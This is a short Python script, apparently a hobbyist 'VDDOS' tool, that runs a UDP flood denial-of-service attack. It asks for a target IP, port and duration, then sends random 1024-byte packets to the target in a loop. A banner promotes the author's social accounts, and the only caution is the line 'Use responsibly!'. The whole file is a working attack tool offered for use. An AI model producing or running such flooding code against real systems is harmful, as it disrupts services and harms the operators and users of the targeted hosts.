import socket
import random
import os
import time

os.system("clear")
os.system('figlet VDDOS')

print('''\
#########################################################################
##                                                                     ##
##              Follow me on Instagram:                               ##
##               https://www.instagram.com/ridvanyaglidere_           ##
##                                                                     ##
##                     Check my GitHub:                                ##
##                       https://github.com/ridvanyaglidere           ##
##                                                                     ##
#########################################################################
    ''')

print("\n" + "="*75)
print("Welcome to the VDDOS Tool - Use responsibly!")
print("="*75 + "\n")

target_ip = input("Target IP: ")
target_port = int(input("Target Port: "))

print("How many packets do you want to send:")
packet_count = int(input())

print("How many seconds do you want to attack:")
attack_duration = int(input())

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

start_time = time.time()
sent_packets = 0

while time.time() - start_time < attack_duration:
    sock.sendto(random._urandom(1024), (target_ip, target_port))
    sent_packets += 1
    print(f"Attack started. Sent packets: {sent_packets}")

print(f"\nAttack finished. Sent {sent_packets} packets in {attack_duration} seconds.")